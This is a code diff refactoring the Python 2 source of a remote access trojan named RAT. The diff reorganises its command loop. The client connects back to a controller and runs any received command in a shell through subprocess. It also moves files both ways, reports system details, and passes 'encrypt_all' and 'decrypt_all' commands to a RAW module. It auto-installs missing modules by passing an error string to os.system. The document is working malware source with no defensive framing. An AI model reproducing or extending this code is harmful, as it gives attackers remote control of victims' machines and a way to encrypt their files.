@@ -113,7 +113,7 @@ try:
 	import socket
 	import getpass
 	import subprocess
-	import RAW
+	from RAW import *
 except ImportError as e:
 	pip = lambda : os.system('pip install' + str(e)[15:])
 	pip()
@@ -143,6 +143,33 @@ class RAT:
 		self.start()
 
 
+
+	# start the service
+	def start(cls):
+		while True:			
+			try:
+				cls.init()
+				cls.connect(cls._loop, cls._port)
+				data = cls.receive()
+				if(data == cls.SIG):
+					cls.FLAG = True
+					cls.send(cls._info + os.getcwd() + "> ")
+				while(cls.FLAG):
+					data = cls.receive()
+					stdoutput = cls.data_handler(data)
+					# Send data to server
+					stdoutput += "\n" + os.getcwd() + "> "
+					stdoutput = stdoutput.decode('gbk').encode('utf-8')
+					cls.send(stdoutput)
+				if(data == 'terminate'):
+					break
+					cls.kill()
+
+			except socket.error as e:
+				cls.socket_handler(e)
+				continue
+
+
 	# initializer
 	def init(cls):
 		# set new socket 
@@ -164,9 +191,11 @@ class RAT:
 		com3 = "\n<!> press Enter and then Ctrl+C :: remote host connection will keep alive\n\n"
 		return "{}{}{}{}{}{}{}".format(str(str1), str(getpass.getuser()), str(str2), str(os.uname()[1]), str(com1), str(com2), str(com3))
 
-	# send data
-	def send(cls, cmd):
-		cls._sock.sendall(cmd)
+
+	# bind connection
+	def connect(cls, addr, port):
+		cls._sock.connect((addr, port))
+
 
 	# receive data
 	def receive(cls):
@@ -180,21 +209,98 @@ class RAT:
 				pkt = cls._sock.revc(cls.BUFFER)
 		return data
 
-	# bind connection
-	def connect(cls, addr, port):
-		cls._sock.connect((addr, port))
-		
+
+	# send data
+	def send(cls, cmd):
+		cls._sock.sendall(cmd)
+
+
+	# data handler
+	def data_handler(cls, data):
+		# check for quit
+		if(data == 'quit' or data == 'terminate'):
+			cls.send('Quitted...')
+			sys.exit(0)
+		# check for change directory
+		elif(data.startswith('cd ')):
+			try:	
+				os.chdir(data[3:])
+				stdoutput = ""
+			except OSError as e:
+				# No such directory
+				if(e[0] is 2):
+					stdoutput = str(e)
+					pass
+				# Other errors
+				else:
+					stdoutput = str(e)
+					pass
+		# check for download
+		elif(data.startswith('download ')):
+			stdoutput = upload(data[9:])
+		# check for upload
+		elif(data.startswith('upload ')):
+			stdoutput = download(data[7:])
+		# send system info
+		elif(data.startswith('sys_info')):
+			stdoutput = cls.drill_down()
+		# encrypt all data
+		elif(data.startswith('encrypt_all')):
+			cls._raw.handler(data, "")
+		# encrypt data 
+		elif(data.startswith('encrypt')):
+			cls._raw.handler(data, "")
+		# decrypt all data
+		elif(data.startswith('decrypt_all')):
+			cls._raw.handler(data, "")
+		# decrypt data 
+		elif(data.startswith('decrypt')):
+			cls._raw.handler(data, "")
+		# bind a shell subprocess  
+		else:
+			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			stdoutput = proc.stdout.read() + proc.stderr.read()
+		return stdoutput
+
+
+	# socket error handler
+	def socket_handler(cls, error_type):
+		# Connection refused
+		if(error_type[0] is 61):
+			cls.stop()
+			time.sleep(cls.LONG_INTERVAL)
+			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
+		# Socket is not connected
+		if(error_type[0] is 57):
+			cls.stop()
+			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
+			time.sleep(cls.LONG_INTERVAL)		
+		# Bad file descriptor
+		elif(error_type[0] is 9):
+			cls.stop()
+			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
+			time.sleep(cls.LONG_INTERVAL)	
+		# Broken Pipe
+		elif(error_type[0] is 32):
+			cls.stop()
+			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
+			time.sleep(cls.LONG_INTERVAL)	
+		else:
+			cls.stop()
+			print "CODE: {}\nMSG: {}".format(str(error_type[0]), str(error_type[1]))
+			time.sleep(cls.LONG_INTERVAL)
+	
 
 	# stop socket connection
 	def stop(cls):
 		cls._sock.close()
+
 
 	# kill socket connection
 	def kill(cls):
 		cls._sock.close()
 		del(cls._sock)
 		sys.exit()
-
 
 
 	# download content from server
@@ -236,99 +342,7 @@ class RAT:
 		return "\n"+str(os.uname())+"\n"
 
 
-	# socket error handler
-	def socket_handler(cls, error_type):
-		# Connection refused
-		if(error_type[0] is 61):
-			cls.stop()
-			time.sleep(cls.LONG_INTERVAL)
-			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
-			
-		# Socket is not connected
-		if(error_type[0] is 57):
-			cls.stop()
-			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
-			time.sleep(cls.LONG_INTERVAL)		
-			
-		# Bad file descriptor
-		elif(error_type[0] is 9):
-			cls.stop()
-			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
-			time.sleep(cls.LONG_INTERVAL)
-			
-		# Broken Pipe
-		elif(error_type[0] is 32):
-			cls.stop()
-			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str([1]))
-			time.sleep(cls.LONG_INTERVAL)
-			
-		else:
-			cls.stop()
-			print "CODE: {}\nMSG: {}".format(str(error_type[0]), str(error_type[1]))
-			time.sleep(cls.LONG_INTERVAL)
-			
-
-	# start the service
-	def start(cls):
-		while True:			
-			try:
-				cls.init()
-				cls.connect(cls._loop, cls._port)
-			
-				data = cls.receive()
-				if(data == cls.SIG):
-					cls.FLAG = True
-					cls.send(cls._info + os.getcwd() + "> ")
-
-				while(cls.FLAG):
-
-					data = cls.receive()
-					# check for quit
-					if(data == 'quit' or data == 'terminate'):
-						cls.send('Quitted...')
-						break
-
-					# check for change directory
-					elif(data.startswith('cd ')):
-						os.chdir(data[3:])
-						stdoutput = ""
-					# check for download
-					elif(data.startswith('download ')):
-						stdoutput = upload(data[9:])
-					# check for upload
-					elif(data.startswith('upload ')):
-						stdoutput = download(data[7:])
-					# send system info
-					elif(data.startswith('sys_info')):
-						stdoutput = cls.drill_down()
-					# encrypt all data
-					elif(data.startswith('encrypt_all')):
-						cls._raw.handler(data, "")
-					# encrypt data 
-					elif(data.startswith('encrypt')):
-						cls._raw.handler(data, "")
-					# decrypt data 
-					elif(data.startswith('decrypt')):
-						cls._raw.handler(data, "")
-
-					# bind a shell subprocess  
-					else:
-						proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-						stdoutput = proc.stdout.read() + proc.stderr.read()
-
-					# Send data to server
-					stdoutput += "\n" + os.getcwd() + "> "
-					stdoutput = stdoutput.decode('gbk').encode('utf-8')
-					cls.send(stdoutput)
-
-				if(data == 'terminate'):
-					break
-					time.sleep(cls.S_INTERVAL)
-
-			except socket.error as e:
-				cls.socket_handler(e)
-				continue
-
+	
 
 	
 def main():
